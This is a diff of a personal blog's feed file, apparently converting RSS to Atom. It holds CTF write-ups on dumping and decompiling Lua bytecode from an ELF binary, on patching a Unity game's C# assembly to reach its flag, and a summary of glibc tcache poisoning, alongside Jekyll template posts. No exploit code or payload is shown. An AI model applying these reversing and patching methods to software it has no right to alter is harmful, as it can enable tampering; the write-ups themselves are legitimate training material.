 	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-</description>
-        <pubDate>Mon, 09 Sep 2019 10:59:00 +0700</pubDate>
-        <link>http://localhost:4000/2019/09/09/tcache_poisoning/</link>
-        <guid isPermaLink="true">http://localhost:4000/2019/09/09/tcache_poisoning/</guid>
-        
-        
-        <category>experience</category>
-        
-      </item>
-    
-      <item>
-        <title>Reverse engineering lua code inside an elf binary</title>
-        <description>&lt;h1 id=&quot;writeup-gemastik12-ctf-decode-me&quot;&gt;writeup Gemastik12 CTF [decode-me]&lt;/h1&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name>arsalan</name></author><category term="heap" /><category term="linux" /><category term="libc" /><category term="ctf" /><category term="pwn" /><summary type="html">Tcache Poisoning what is tcache poisoning ? In glibc-2.26, TCache (per-thread cache), a new feature, was introduced in malloc. and tcache poisoning is a technique to poison Tcache feature in glibc-2.26. for example from how2heap by shellpish team</summary></entry><entry><title type="html">Reverse engineering lua bytecode inside an elf binary</title><link href="http://localhost:4000/ctf/2019/09/09/reverse-engineering-lua-bytecode.html" rel="alternate" type="text/html" title="Reverse engineering lua bytecode inside an elf binary" /><published>2019-09-09T10:59:00+07:00</published><updated>2019-09-09T10:59:00+07:00</updated><id>http://localhost:4000/ctf/2019/09/09/reverse-engineering-lua-bytecode</id><content type="html" xml:base="http://localhost:4000/ctf/2019/09/09/reverse-engineering-lua-bytecode.html">&lt;h1 id=&quot;writeup-gemastik12-ctf-decode-me&quot;&gt;writeup Gemastik12 CTF [decode-me]&lt;/h1&gt;
 
 &lt;p&gt;this is a ctf competition challenge. in this blog post, i will explain how i solve this challenge. actually, i got this challenge when competing in gemastik 12 ctf telkom, in this challenge we was given a binary called mooncode you can download the ELF binary &lt;a href=&quot;https://google.com&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
 
@@ -370,9 +691,9 @@ ctf{y0u_must_b3_a_pwnerrrr!!!!!}
 
 &lt;p&gt;this is the information of this binary&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mooncode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), 
-dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, 
-BuildID[sha1]=c0e15ca22b562c60f5d4535eea61d26157ecdde7, 
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mooncode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),
+dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0,
+BuildID[sha1]=c0e15ca22b562c60f5d4535eea61d26157ecdde7,
 not stripped
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -392,8 +713,8 @@ let’s open it on Ghidra, if you are not familiar with Ghidra you can check the
 
   &lt;span class=&quot;n&quot;&gt;_local_AL_15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;luaL_newstate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;luaL_openlibs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_local_AL_15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;local_28&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;--- this is the lua bytecode was stored 
-&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;lua_load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_local_AL_15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readMemFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DAT_00102004&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_28&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;--- this is the lua bytecode was stored&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;lua_load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_local_AL_15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readMemFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DAT_00102004&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;lua_pcallk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_local_AL_15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
@@ -406,7 +727,10 @@ let’s open it on Ghidra, if you are not familiar with Ghidra you can check the
 
 &lt;p&gt;as you can see there’s “Luas” string inside this memory , so we can just dump or export this code variable using Ghidra. and here’s the lua bytecode we successfully dump&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/2019-10-03-171529_545x57_scrot.png&quot; class=&quot;center&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[tripoloski]──[~/code/ctf/gemastik2019/reversing/decode-me]──[pwn-box]: $
+└────╼ &amp;gt;&amp;gt; file .data_\[00104060\,001046d5\]_1217343673003918772.tmp.bin
+.data_[00104060,001046d5]_1217343673003918772.tmp.bin: Lua bytecode,
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;since this is a Lua bytecode file, so we can get the original source code by decompile it using &lt;a href=&quot;https://sourceforge.net/projects/unluac/&quot;&gt;unluac&lt;/a&gt; , and here’s the source code&lt;/p&gt;
 
@@ -500,16 +824,106 @@ let’s open it on Ghidra, if you are not familiar with Ghidra you can check the
 
 &lt;p&gt;and we got our flag&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/2019-10-03-174334_664x273_scrot.png&quot; class=&quot;center&quot; /&gt;&lt;/p&gt;
-</description>
-        <pubDate>Mon, 09 Sep 2019 10:59:00 +0700</pubDate>
-        <link>http://localhost:4000/2019/09/09/reverse-engineering-lua-code/</link>
-        <guid isPermaLink="true">http://localhost:4000/2019/09/09/reverse-engineering-lua-code/</guid>
-        
-        
-        <category>ctf</category>
-        
-      </item>
-    
-  </channel>
-</rss>
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python mooncode.py
+gemastik12{reversing_the_moon}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>arsalan</name></author><category term="reversing" /><category term="lua" /><category term="ctf-writeup" /><summary type="html">writeup Gemastik12 CTF [decode-me]</summary></entry><entry><title type="html">Reverse engineering opensource BIOS</title><link href="http://localhost:4000/ctf/2019/09/09/reverse-engineering-opensource-BIOS.html" rel="alternate" type="text/html" title="Reverse engineering opensource BIOS" /><published>2019-09-09T10:59:00+07:00</published><updated>2019-09-09T10:59:00+07:00</updated><id>http://localhost:4000/ctf/2019/09/09/reverse-engineering-opensource-BIOS</id><content type="html" xml:base="http://localhost:4000/ctf/2019/09/09/reverse-engineering-opensource-BIOS.html"></content><author><name>arsalan</name></author><summary type="html"></summary></entry><entry><title type="html">Reverse engineering unity game</title><link href="http://localhost:4000/ctf/2019/09/09/reverse-engineering-unity-game.html" rel="alternate" type="text/html" title="Reverse engineering unity game" /><published>2019-09-09T10:59:00+07:00</published><updated>2019-09-09T10:59:00+07:00</updated><id>http://localhost:4000/ctf/2019/09/09/reverse-engineering-unity-game</id><content type="html" xml:base="http://localhost:4000/ctf/2019/09/09/reverse-engineering-unity-game.html">&lt;h1 id=&quot;writeup-xmas-ctf-2019-lapland-mission&quot;&gt;writeup xmas-ctf 2019 lapland mission&lt;/h1&gt;
+
+&lt;p&gt;in this challenge we are given an archive that contains a game ,
+the game it self looks like an fps game , it’s using unity (looks like)
+, to solve this challenge i use dnspy to patch some code. , let’s play
+the game first&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/x-mas-lapland/ezgif.com-video-to-gif.gif&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;the bot is very fast , and there’s alot of bot outside , our mission is
+to kill all the bot , to kill the bot we have to shot on the head , hmm it’s sounds
+impossible right ? since they will kill us when we go outside.&lt;/p&gt;
+
+&lt;p&gt;let’s open Assembly-CSharp.dll file inside ‘X-MAS_Data/managed/’ and take a look at
+shoot() from bot class&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/x-mas-lapland/before-shoot.PNG&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;this is looks like , if the bot see us , we will die. so we can change
+&lt;code class=&quot;highlighter-rouge&quot;&gt;this.weapon.Shoot()&lt;/code&gt; to this&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/x-mas-lapland/after-shoot.PNG&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;so the bot will never see us , at least we are not dead lol. this changes will
+affect like this&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/x-mas-lapland/immortal.gif&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;we are immortal now lol. so now we have to kill them , but i was lazy to do that.
+so i try to find another way to get the flag without kill all the bot , and i found
+checkbots function&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/x-mas-lapland/checkbots-class.PNG&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;well , it’s looks like this function can help us to get our flag. actually this
+function will check all the bot and if there is no bot the flag will not set to
+false and the flag will appear. so i change the code&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/x-mas-lapland/checkbots-class-after.PNG&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;if we can trigger this function , the flag will appear, in order to do that
+we have to kill 1 bot so this function will trigger  and give us our shinny Flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/x-mas-lapland/flaggg.gif&quot; /&gt;&lt;/p&gt;</content><author><name>arsalan</name></author><category term="ctf-writeup" /><category term="reversing" /><summary type="html">writeup xmas-ctf 2019 lapland mission</summary></entry><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/2019/04/16/welcome-to-jekyll2.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2019-04-16T00:00:00+07:00</published><updated>2019-04-16T00:00:00+07:00</updated><id>http://localhost:4000/2019/04/16/welcome-to-jekyll2</id><content type="html" xml:base="http://localhost:4000/2019/04/16/welcome-to-jekyll2.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;“This is a quote which should be followed”&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Chris Wayne&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;However, these are bulletpoints:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/li&gt;
+  &lt;li&gt;another point&lt;/li&gt;
+  &lt;li&gt;that’s it&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;However, these entries should not be styled:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;an entry&lt;/li&gt;
+  &lt;li&gt;another entry&lt;/li&gt;
+  &lt;li&gt;that’s another entry&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;video preload=&quot;auto&quot; poster=&quot;https://pbs.twimg.com/tweet_video_thumb/D5aj3tfW0AIiSxo.jpg&quot; src=&quot;https://video.twimg.com/tweet_video/D5aj3tfW0AIiSxo.mp4&quot; type=&quot;video/mp4&quot; autoplay=&quot;&quot; controls=&quot;&quot;&gt;&lt;/video&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;an-interesting-fact-on-the-economy-of-modern-america&quot;&gt;An interesting fact on the economy of modern America&lt;/h1&gt;
+
+&lt;p&gt;Pictures look like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://picsum.photos/200&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name>arsalan</name></author><category term="welcome" /><category term="introduction" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">Introducing waiting functionality</title><link href="http://localhost:4000/2019/04/13/introduction-to-waiting.html" rel="alternate" type="text/html" title="Introducing waiting functionality" /><published>2019-04-13T00:00:00+07:00</published><updated>2019-04-13T00:00:00+07:00</updated><id>http://localhost:4000/2019/04/13/introduction-to-waiting</id><content type="html" xml:base="http://localhost:4000/2019/04/13/introduction-to-waiting.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name>arsalan</name></author><category term="introduction" /><category term="tutorial" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry></feed>
